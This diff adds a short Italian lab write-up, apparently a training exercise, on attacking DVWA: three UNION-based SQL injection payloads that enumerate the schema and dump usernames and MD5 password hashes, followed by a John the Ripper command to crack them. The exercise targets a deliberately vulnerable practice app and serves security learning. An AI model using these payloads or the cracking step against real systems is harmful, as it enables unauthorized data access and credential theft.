@@ -1,0 +1,17 @@
+Prima di craccare le password ho dovuto reperire le informazioni all'interno della DVWA facendo SQL injection. 
+Questi sono stati i comandi che ho utilizzato per trovare gli user e le password del DB target:
+
+' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_type = 'base table' --
+
+' UNION SELECT COLUMN_NAME,null FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' --
+
+ ' UNION SELECT user,password FROM dvwa.users --
+
+Dopo aver recuperato gli user e le password in formato MD5 le ho inserite in un file chiamato crack.txt.
+
+Successivamente ho utilizzato il tool John the ripper per craccare le password trovate. 
+La sintassi che ho utilizzato è stata questa:
+
+ john --format=raw-md5 crack.txt 
+
+Con questa sintassi john utilizza un meccanismo di cracking che va a generare e confrontare tutte le firme hash in md5 per decodificarne la password.
